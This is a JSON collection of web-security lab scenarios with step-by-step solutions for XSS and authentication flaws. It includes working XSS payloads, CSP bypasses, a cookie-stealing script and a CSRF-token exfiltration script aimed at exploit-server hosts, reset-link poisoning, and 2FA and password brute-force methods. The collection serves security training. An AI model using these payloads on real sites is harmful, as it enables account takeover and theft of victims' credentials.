+      "7.Normally, | is a bitwise or operation in JavaScript, but in AngularJS it indicates a filter operation, in this case the orderBy filter. The colon signifies an argument that is being sent to the filter. In the argument, instead of calling the alert function directly, we assign it to the variable z. The function will only be called when the orderBy operation reaches the window object in the $event.path array. This means it can be called in the scope of the window without an explicit reference to the window object, effectively bypassing AngularJS's window check."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS with event handlers and href attributes blocked",
+    "Lab Description": "This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.\nTo solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.\nNote that you need to label your vector with the word \"Click\" in order to induce the simulated lab user to click your vector. For example:\n<a href=\"\">Click me</a>",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1.Visit the following URL, replacing YOUR-LAB-ID with your lab ID:",
+      "2.https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E"
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS in a JavaScript URL with some characters blocked",
+    "Lab Description": "This lab reflects your input in a JavaScript URL, but all is not as it seems. This initially seems like a trivial challenge; however, the application is blocking some characters in an attempt to prevent XSS attacks.\nTo solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1.Visit the following URL, replacing YOUR-LAB-ID with your lab ID:",
+      "2.https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27",
+      "3.The lab will be solved, but the alert will only be called if you click \"Back to blog\" at the bottom of the page.",
+      "4.The exploit uses exception handling to call the alert function with arguments. The throw statement is used, separated with a blank comment in order to get round the no spaces restriction. The alert function is assigned to the onerror exception handler.",
+      "5.As throw is a statement, it cannot be used as an expression. Instead, we need to use arrow functions to create a block so that the throw statement can be used. We then need to call this function, so we assign it to the toString property of window and trigger this by forcing a string conversion on window."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS protected by very strict CSP, with dangling markup attack",
+    "Lab Description": "This lab using a strict CSP that blocks outgoing requests to external web sites.\nTo solve the lab, first perform a cross-site scripting attack that bypasses the CSP and exfiltrates a simulated victim user's CSRF token using Burp Collaborator. You then need to change the simulated user's email address to hacker@evil-user.net.\nYou must label your vector with the word \"Click\" in order to induce the simulated user to click it. For example:\n<a href=\"\">Click me</a>\nYou can log in to your own account using the following credentials: wiener:peter",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1.Log in to the lab using the account provided above.",
+      "2.Examine the change email function. Observe that there is an XSS vulnerability in the email parameter.",
+      "3.Go to the Collaborator tab.",
+      "4.Click \"Copy to clipboard\" to copy a unique Burp Collaborator payload to your clipboard.",
+      "5.Back in the lab, go to the exploit server and add the following code, replacing YOUR-LAB-ID and YOUR-EXPLOIT-SERVER-ID with your lab ID and exploit server ID respectively, and replacing YOUR-COLLABORATOR-ID with the payload that you just copied from Burp Collaborator.",
+      "6.<script>",
+      "7.if(window.name) {",
+      "8.new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);",
+      "9.} else {",
+      "10.location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';",
+      "11.}",
+      "12.</script>",
+      "13.Click \"Store\" and then \"Deliver exploit to victim\". When the user visits the website containing this malicious script, if they click on the \"Click me\" link while they are still logged in to the lab website, their browser will send a request containing their CSRF token to your malicious website. You can then steal this CSRF token using Burp Collaborator.",
+      "14.Go back to the Collaborator tab, and click \"Poll now\". If you don't see any interactions listed, wait a few seconds and try again. You should see an HTTP interaction that was initiated by the application. Select the HTTP interaction, go to the request tab, and copy the user's CSRF token.",
+      "15.With Burp's Intercept feature switched on, go back to the change email function of the lab and submit a request to change the email to any random address.",
+      "16.In Burp, go to the intercepted request and change the value of the email parameter to hacker@evil-user.net.",
+      "17.Right-click on the request and, from the context menu, select \"Engagement tools\" and then \"Generate CSRF PoC\". The popup shows both the request and the CSRF HTML that is generated by it. In the request, replace the CSRF token with the one that you stole from the victim earlier.",
+      "18.Click \"Options\" and make sure that the \"Include auto-submit script\" is activated.",
+      "19.Click \"Regenerate\" to update the CSRF HTML so that it contains the stolen token, then click \"Copy HTML\" to save it to your clipboard.",
+      "20.Drop the request and switch off the intercept feature.",
+      "21.Go back to the exploit server and paste the CSRF HTML into the body. You can overwrite the script that we entered earlier.",
+      "22.Click \"Store\" and \"Deliver exploit to victim\". The user's email will be changed to hacker@evil-user.net."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Reflected XSS protected by CSP, with CSP bypass",
+    "Lab Description": "This lab uses CSP and contains a reflected XSS vulnerability.\nTo solve the lab, perform a cross-site scripting attack that bypasses the CSP and calls the alert function.\nPlease note that the intended solution to this lab is only possible in Chrome.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1.Enter the following into the search box:",
+      "2.<img src=1 onerror=alert(1)>",
+      "3.Observe that the payload is reflected, but the CSP prevents the script from executing.",
+      "4.In Burp Proxy, observe that the response contains a Content-Security-Policy header, and the report-uri directive contains a parameter called token. Because you can control the token parameter, you can inject your own CSP directives into the policy.",
+      "5.Visit the following URL, replacing YOUR-LAB-ID with your lab ID:",
+      "6.https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27",
+      "7.The injection uses the script-src-elem directive in CSP. This directive allows you to target just script elements. Using this directive, you can overwrite existing script-src rules enabling you to inject unsafe-inline, which allows you to use inline scripts."
+    ],
+    "Vulnerability name": "Cross-site scripting"
+  },
+  {
+    "Lab scenario": "Username enumeration via different responses",
+    "Lab Description": "This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:\nTo solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.With Burp running, investigate the login page and submit an invalid username and password.",
+      "2.In Burp, go to Proxy > HTTP history and find the POST /login request. Highlight the value of the username parameter in the request and send it to Burp Intruder.",
+      "3.In Burp Intruder, notice that the username parameter is automatically set as a payload position. This position is indicated by two § symbols, for example: username=§invalid-username§. Leave the password as any static value for now.",
+      "4.Make sure that Sniper attack is selected.",
+      "5.In the Payloads side panel, make sure that the Simple list payload type is selected.",
+      "6.Under Payload configuration, paste the list of candidate usernames. Finally, click  Start attack. The attack will start in a new window.",
+      "7.When the attack is finished, examine the Length column in the results table. You can click on the column header to sort the results. Notice that one of the entries is longer than the others. Compare the response to this payload with the other responses. Notice that other responses contain the message Invalid username, but this response says Incorrect password. Make a note of the username in the Payload column.",
+      "8.Close the attack and go back to the Intruder tab. Click Clear §, then change the username parameter to the username you just identified. Add a payload position to the password parameter. The result should look something like this:",
+      "9.username=identified-user&password=§invalid-password§",
+      "10.In the Payloads side panel, clear the list of usernames and replace it with the list of candidate passwords. Click  Start attack.",
+      "11.When the attack is finished, look at the Status column. Notice that each request received a response with a 200 status code except for one, which got a 302 response. This suggests that the login attempt was successful - make a note of the password in the Payload column.",
+      "12.Log in using the username and password that you identified and access the user account page to solve the lab.",
+      "13.Note",
+      "14.It's also possible to brute-force the login using a single cluster bomb attack. However, it's generally much more efficient to enumerate a valid username first if possible."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "2FA simple bypass",
+    "Lab Description": "This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.Log in to your own account. Your 2FA verification code will be sent to you by email. Click the Email client button to access your emails.",
+      "2.Go to your account page and make a note of the URL.",
+      "3.Log out of your account.",
+      "4.Log in using the victim's credentials.",
+      "5.When prompted for the verification code, manually change the URL to navigate to /my-account. The lab is solved when the page loads."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "Password reset broken logic",
+    "Lab Description": "This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his \"My account\" page.",
+    "Difficulty Level": "Easy",
+    "Solution Steps": [
+      "1.With Burp running, click the Forgot your password? link and enter your own username.",
+      "2.Click the Email client button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.",
+      "3.In Burp, go to Proxy > HTTP history and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the POST /forgot-password?temp-forgot-password-token request contains the username as hidden input. Send this request to Burp Repeater.",
+      "4.In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the temp-forgot-password-token parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password.",
+      "5.In the browser, request a new password reset and change your password again. Send the POST /forgot-password?temp-forgot-password-token request to Burp Repeater again.",
+      "6.In Burp Repeater, delete the value of the temp-forgot-password-token parameter in both the URL and request body. Change the username parameter to carlos. Set the new password to whatever you want and send the request.",
+      "7.In the browser, log in to Carlos's account using the new password you just set. Click My account to solve the lab."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "Username enumeration via subtly different responses",
+    "Lab Description": "This lab is subtly vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:\nTo solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.With Burp running, submit an invalid username and password. Highlight the username parameter in the POST /login request and send it to Burp Intruder.",
+      "2.Go to Intruder. Notice that the username parameter is automatically marked as a payload position.",
+      "3.In the Payloads side panel, make sure that the Simple list payload type is selected and add the list of candidate usernames.",
+      "4.Click on the  Settings tab to open the Settings side panel. Under Grep - Extract, click Add. In the dialog that appears, scroll down through the response until you find the error message Invalid username or password.. Use the mouse to highlight the text content of the message. The other settings will be automatically adjusted. Click OK and then start the attack.",
+      "5.When the attack is finished, notice that there is an additional column containing the error message you extracted. Sort the results using this column to notice that one of them is subtly different.",
+      "6.Look closer at this response and notice that it contains a typo in the error message - instead of a full stop/period, there is a trailing space. Make a note of this username.",
+      "7.Close the results window and go back to the Intruder tab. Insert the username you just identified and add a payload position to the password parameter:",
+      "8.username=identified-user&password=§invalid-password§",
+      "9.In the Payloads side panel, clear the list of usernames and replace it with the list of passwords. Start the attack.",
+      "10.When the attack is finished, notice that one of the requests received a 302 response. Make a note of this password.",
+      "11.Log in using the username and password that you identified and access the user account page to solve the lab.",
+      "12.Note",
+      "13.It's also possible to brute-force the login using a single cluster bomb attack. However, it's generally much more efficient to enumerate a valid username first if possible."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "Username enumeration via response timing",
+    "Lab Description": "This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.With Burp running, submit an invalid username and password, then send the POST /login request to Burp Repeater. Experiment with different usernames and passwords. Notice that your IP will be blocked if you make too many invalid login attempts.",
+      "2.Identify that the X-Forwarded-For header is supported, which allows you to spoof your IP address and bypass the IP-based brute-force protection.",
+      "3.Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.",
+      "4.Send this request to Burp Intruder and select Pitchfork attack from the attack type drop-down menu. Add the X-Forwarded-For header.",
+      "5.Add payload positions for the X-Forwarded-For header and the username parameter. Set the password to a very long string of characters (about 100 characters should do it).",
+      "6.In the Payloads side panel, select position 1 from the Payload position drop-down list. Select the Numbers payload type. Enter the range 1 - 100 and set the step to 1. Set the max fraction digits to 0. This will be used to spoof your IP.",
+      "7.Select position 2 from the Payload position drop-down list, then add the list of usernames. Start the attack.",
+      "8.When the attack finishes, at the top of the dialog, click Columns and select the Response received and Response completed options. These two columns are now displayed in the results table.",
+      "9.Notice that one of the response times was significantly longer than the others. Repeat this request a few times to make sure it consistently takes longer, then make a note of this username.",
+      "10.Create a new Burp Intruder attack for the same request. Add the X-Forwarded-For header again and add a payload position to it. Insert the username that you just identified and add a payload position to the password parameter.",
+      "11.In the Payloads side panel, add the list of numbers to payload position 1 and add the list of passwords to payload position 2. Start the attack.",
+      "12.When the attack is finished, find the response with a 302 status. Make a note of this password.",
+      "13.Log in using the username and password that you identified and access the user account page to solve the lab.",
+      "14.Note",
+      "15.It's also possible to brute-force the login using a single cluster bomb attack. However, it's generally much more efficient to enumerate a valid username first if possible."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "Broken brute-force protection, IP block",
+    "Lab Description": "This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.With Burp running, investigate the login page. Observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row. However, notice that you can reset the counter for the number of failed login attempts by logging in to your own account before this limit is reached.",
+      "2.Enter an invalid username and password, then send the POST /login request to Burp Intruder. Create a pitchfork attack with payload positions in both the username and password parameters.",
+      "3.Click  Resource pool to open the Resource",
+      "4.pool side panel, then add the attack to a resource pool with Maximum concurrent requests set to 1. By only sending one request at a time, you can ensure that your login attempts are sent to the server in the correct order.",
+      "5.Click  Payloads to open the Payloads side panel, then select position 1 from the Payload position drop-down list. Add a list of payloads that alternates between your username and carlos. Make sure that your username is first and that carlos is repeated at least 100 times.",
+      "6.Edit the list of candidate passwords and add your own password before each one. Make sure that your password is aligned with your username in the other list.",
+      "7.Select position 2 from the Payload position drop-down list, then add the password list. Start the attack.",
+      "8.When the attack finishes, filter the results to hide responses with a 200 status code. Sort the remaining results by username. There should only be a single 302 response for requests with the username carlos. Make a note of the password from the Payload 2 column.",
+      "9.Log in to Carlos's account using the password that you identified and access his account page to solve the lab."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "Username enumeration via account lock",
+    "Lab Description": "This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.With Burp running, investigate the login page and submit an invalid username and password. Send the POST /login request to Burp Intruder.",
+      "2.Select Cluster bomb attack from the attack type drop-down menu. Add a payload position to the username parameter. Add a blank payload position to the end of the request body by clicking Add §. The result should look something like this:",
+      "3.username=§invalid-username§&password=example§§",
+      "4.In the Payloads side panel, add the list of usernames for the first payload position. For the second payload position, select the Null payloads type and choose the option to generate 5 payloads. This will effectively cause each username to be repeated 5 times. Start the attack.",
+      "5.In the results, notice that the responses for one of the usernames were longer than responses when using other usernames. Study the response more closely and notice that it contains a different error message: You have made too many incorrect login attempts. Make a note of this username.",
+      "6.Create a new Burp Intruder attack on the POST /login request, but this time select Sniper attack from the attack type drop-down menu. Set the username parameter to the username that you just identified and add a payload position to the password parameter.",
+      "7.Add the list of passwords to the payload set and create a grep extraction rule for the error message. Start the attack.",
+      "8.In the results, look at the grep extract column. Notice that there are a couple of different error messages, but one of the responses did not contain any error message. Make a note of this password.",
+      "9.Wait for a minute to allow the account lock to reset. Log in using the username and password that you identified and access the user account page to solve the lab."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "2FA broken logic",
+    "Lab Description": "This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.\nYou also have access to the email server to receive your 2FA verification code.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the POST /login2 request, the verify parameter is used to determine which user's account is being accessed.",
+      "2.Log out of your account.",
+      "3.Send the GET /login2 request to Burp Repeater. Change the value of the verify parameter to carlos and send the request. This ensures that a temporary 2FA code is generated for Carlos.",
+      "4.Go to the login page and enter your username and password. Then, submit an invalid 2FA code.",
+      "5.Send the POST /login2 request to Burp Intruder.",
+      "6.In Burp Intruder, set the verify parameter to carlos and add a payload position to the mfa-code parameter. Brute-force the verification code.",
+      "7.Load the 302 response in the browser.",
+      "8.Click My account to solve the lab."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "Brute-forcing a stay-logged-in cookie",
+    "Lab Description": "This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.\nTo solve the lab, brute-force Carlos's cookie to gain access to his My account page.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.With Burp running, log in to your own account with the Stay logged in option selected. Notice that this sets a stay-logged-in cookie.",
+      "2.Examine this cookie in the Inspector panel and notice that it is Base64-encoded. Its decoded value is wiener:51dc30ddc473d43a6011e9ebba6ca770. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:",
+      "3.base64(username+':'+md5HashOfPassword)",
+      "4.Log out of your account.",
+      "5.In the most recent GET /my-account?id=wiener request highlight the stay-logged-in cookie parameter and send the request to Burp Intruder.",
+      "6.In Burp Intruder, notice that the stay-logged-in cookie has been automatically added as a payload position. Add your own password as a single payload.",
+      "7.Under Payload processing, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.",
+      "8.Hash: MD5",
+      "9.Add prefix: wiener:",
+      "10.Encode: Base64-encode",
+      "11.As the Update email button is only displayed when you access the My",
+      "12.account page in an authenticated state, we can use the presence or absence of this button to determine whether we've successfully brute-forced the cookie. In the  Settings side panel, add a grep match rule to flag any responses containing the string Update email. Start the attack.",
+      "13.Notice that the generated payload was used to successfully load your own account page. This confirms that the payload processing rules work as expected and you were able to construct a valid cookie for your own account.",
+      "14.Make the following adjustments and then repeat this attack:",
+      "15.Remove your own password from the payload list and add the list of candidate passwords instead.",
+      "16.Change the id parameter in the request URL to carlos instead of wiener.",
+      "17.Change the Add prefix rule to add carlos: instead of wiener:.",
+      "18.When the attack is finished, the lab will be solved. Notice that only one request returned a response containing Update email. The payload from this request is the valid stay-logged-in cookie for Carlos's account."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "Offline password cracking",
+    "Lab Description": "This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the \"My account\" page.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.With Burp running, use your own account to investigate the \"Stay logged in\" functionality. Notice that the stay-logged-in cookie is Base64 encoded.",
+      "2.In the Proxy > HTTP history tab,  go to the Response to your login request and highlight the stay-logged-in cookie, to see that it is constructed as follows:",
+      "3.username+':'+md5HashOfPassword",
+      "4.You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.",
+      "5.Go to the exploit server and make a note of the URL.",
+      "6.Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:",
+      "7.<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>",
+      "8.On the exploit server, open the access log. There should be a GET request from the victim containing their stay-logged-in cookie.",
+      "9.Decode the cookie in Burp Decoder. The result will be:",
+      "10.carlos:26323c16d5f4dabff3bb136f2460a943",
+      "11.Copy the hash and paste it into a search engine. This will reveal that the password is onceuponatime.",
+      "12.Log in to the victim's account, go to the \"My account\" page, and delete their account to solve the lab.",
+      "13.Note",
+      "14.The purpose of this lab is to demonstrate the potential of cracking passwords offline. Most likely, this would be done using a tool like hashcat, for example. When testing your clients' websites, we do not recommend submitting hashes of their real passwords in a search engine."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "Password reset poisoning via middleware",
+    "Lab Description": "This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.",
+      "2.Send the POST /forgot-password request to Burp Repeater. Notice that the X-Forwarded-Host header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.",
+      "3.Go to the exploit server and make a note of your exploit server URL.",
+      "4.Go back to the request in Burp Repeater and add the X-Forwarded-Host header with your exploit server URL:",
+      "5.X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net",
+      "6.Change the username parameter to carlos and send the request.",
+      "7.Go to the exploit server and open the access log. You should see a GET /forgot-password request, which contains the victim's token as a query parameter. Make a note of this token.",
+      "8.Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into the browser and change the value of the temp-forgot-password-token parameter to the value that you stole from the victim.",
+      "9.Load this URL and set a new password for Carlos's account.",
+      "10.Log in to Carlos's account using the new password to solve the lab."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "Password brute-force via password change",
+    "Lab Description": "This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his \"My account\" page.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "1.With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.",
+      "2.Notice the behavior when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states Current password is incorrect. If you enter a valid current password, but two different new passwords, the message says New passwords do not match. We can use this message to enumerate correct passwords.",
+      "3.Enter your correct current password and two new passwords that do not match. Send this POST /my-account/change-password request to Burp Intruder.",
+      "4.In Burp Intruder, change the username parameter to carlos and add a payload position to the current-password parameter. Make sure that the new password parameters are set to two different values. For example:",
+      "5.username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc",
+      "6.In the Payloads side panel, enter the list of passwords as the payload set.",
+      "7.Click  Settings to open the Settings side panel, then add a grep match rule to flag responses containing New passwords do not match. Start the attack.",
+      "8.When the attack finished, notice that one response was found that contains the New passwords do not match message. Make a note of this password.",
+      "9.In the browser, log out of your own account and lock back in with the username carlos and the password that you just identified.",
+      "10.Click My account to solve the lab."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "Broken brute-force protection, multiple credentials per request",
+    "Lab Description": "This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1.With Burp running, investigate the login page. Notice that the POST /login request submits the login credentials in JSON format. Send this request to Burp Repeater.",
+      "2.In Burp Repeater, replace the single string value of the password with an array of strings containing all of the candidate passwords. For example:",
+      "3.\"username\" : \"carlos\",",
+      "4.\"password\" : [",
+      "5.\"123456\",",
+      "6.\"password\",",
+      "7.\"qwerty\"",
+      "8....",
+      "9.]",
+      "10.Send the request. This will return a 302 response.",
+      "11.Right-click on this request and select Show response in browser. Copy the URL and load it in the browser. The page loads and you are logged in as carlos.",
+      "12.Click My account to access Carlos's account page and solve the lab."
+    ],
+    "Vulnerability name": "Authentication"
+  },
+  {
+    "Lab scenario": "2FA bypass using a brute-force attack",
+    "Lab Description": "This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.\nVictim's credentials: carlos:montoya",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "1.With Burp running, log in as carlos and investigate the 2FA verification process. Notice that if you enter the wrong code twice, you will be logged out again. You need to use Burp's session handling features to log back in automatically before sending each request.",
+      "2.In Burp, click  Settings to open the Settings dialog, then click Sessions. In the Session Handling Rules panel, click Add. The Session handling rule editor dialog opens.",
+      "3.In the dialog, go to the Scope tab. Under URL Scope, select the option Include all URLs.",
+      "4.Go back to the Details tab and under Rule Actions, click Add > Run a macro.",
+      "5.Under Select macro click Add to open the Macro Recorder. Select the following 3 requests:",
+      "6.GET /login",
+      "7.POST /login",
+      "8.GET /login2",
+      "9.Then click OK. The Macro Editor dialog opens.",
+      "10.Click Test macro and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly.",
+      "11.Keep clicking OK to close the various dialogs until you get back to the main Burp window. The macro will now automatically log you back in as Carlos before each request is sent by Burp Intruder.",
+      "12.Send the POST /login2 request to Burp Intruder.",
+      "13.In Burp Intruder, add a payload position to the mfa-code parameter.",
+      "14.In the Payloads side panel, select the Numbers payload type. Enter the range 0 - 9999 and set the step to 1. Set the min/max integer digits to 4 and max fraction digits to 0. This will create a payload for every possible 4-digit integer.",
+      "15.Click on  Resource pool to open the Resource",
+      "16.pool side panel. Add the attack to a resource pool with the Maximum concurrent requests set to 1.",
+      "17.Start the attack. Eventually, one of the requests will return a 302 status code. Right-click on this request and select Show response in browser. Copy the URL and load it in the browser.",
+      "18.Click My account to solve the lab."
+    ],
+    "Vulnerability name": "Authentication"
+  }
+]
